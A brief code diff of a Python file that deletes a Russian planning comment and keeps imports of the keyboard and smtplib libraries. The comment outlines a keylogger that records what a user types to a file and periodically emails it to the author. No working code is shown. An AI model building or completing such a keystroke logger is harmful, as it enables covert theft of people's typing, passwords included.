@@ -1,13 +1,3 @@
-"""
-юзер вводит текст, он записывается в файл
-через какое-то время, он отправляется мне на почту
-
-1) pip install keyboard
-2) запись в файл через with as
-3) SMTP - pip install smtplib
-4) threading -> Timer
-
-"""
 
 import keyboard
 import smtplib
